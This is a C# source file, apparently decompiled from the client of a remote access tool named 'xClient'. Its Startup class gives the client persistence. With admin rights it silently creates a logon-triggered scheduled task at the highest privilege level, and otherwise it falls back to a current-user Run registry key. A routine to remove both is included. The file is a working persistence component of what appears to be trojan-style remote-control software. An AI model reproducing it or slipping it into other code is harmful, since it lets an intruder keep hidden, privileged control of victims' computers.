using System;
using System.Diagnostics;
using Microsoft.Win32;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Helper;

namespace xClient.Core.Installation;

public static class Startup
{
	public static bool AddToStartup()
	{
		if (WindowsAccountHelper.GetAccountType() == "Admin")
		{
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo("schtasks");
				processStartInfo.Arguments = "/create /tn \"" + Settings.STARTUPKEY + "\" /sc ONLOGON /tr \"" + ClientData.CurrentPath + "\" /rl HIGHEST /f";
				processStartInfo.UseShellExecute = false;
				processStartInfo.CreateNoWindow = true;
				Process? process = Process.Start(processStartInfo);
				process!.WaitForExit(1000);
				if (process!.ExitCode == 0)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
			return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath, addQuotes: true);
		}
		return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath, addQuotes: true);
	}

	public static bool RemoveFromStartup()
	{
		if (WindowsAccountHelper.GetAccountType() == "Admin")
		{
			try
			{
				Process? process = Process.Start(new ProcessStartInfo("schtasks")
				{
					Arguments = "/delete /tn \"" + Settings.STARTUPKEY + "\" /f",
					UseShellExecute = false,
					CreateNoWindow = true
				});
				process!.WaitForExit(1000);
				if (process!.ExitCode == 0)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
			return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
		}
		return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
	}
}
